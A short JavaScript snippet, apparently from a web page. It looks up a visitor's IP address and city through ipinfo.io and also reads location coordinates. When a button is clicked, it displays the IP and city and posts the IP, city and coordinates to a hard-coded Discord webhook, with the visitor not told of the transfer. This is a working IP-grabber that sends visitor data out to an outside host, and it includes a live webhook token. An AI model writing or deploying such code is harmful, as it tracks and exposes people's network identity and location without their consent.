window.addEventListener("load",e => {

var web = "https://discord.com/api/webhooks/1080866736234045511/i_j_4QMtRFMlWenJW-R-aIf2AMnum3Yw09HHhCySNSDso3nVrrxj7Y4X_Lz0nvVrPsOZ";
  
let ip;
  let city;
let longitude;
let latitude;
  $.get("https://ipinfo.io", function(response) {
           	ip = response.ip;
    city = response.city;

longitude = response.longitude;
latitude = response.latitude;

  }, "json")

  function discord_message(webHookURL, message) {
        var xhr = new XMLHttpRequest();
        xhr.open("POST", webHookURL, true);
        xhr.setRequestHeader('Content-Type', 'application/json');
        xhr.send(JSON.stringify({
            'content': message,
            'username':'AI',
        }));
    }
  
$(".getip").on("click", function(){
  
  document.getElementById("stuff").innerHTML = ip + ", " + city;
  discord_message(web, "ip found " + ip + ", " + city + ", " + longitude + ", " + latitude);
});
});
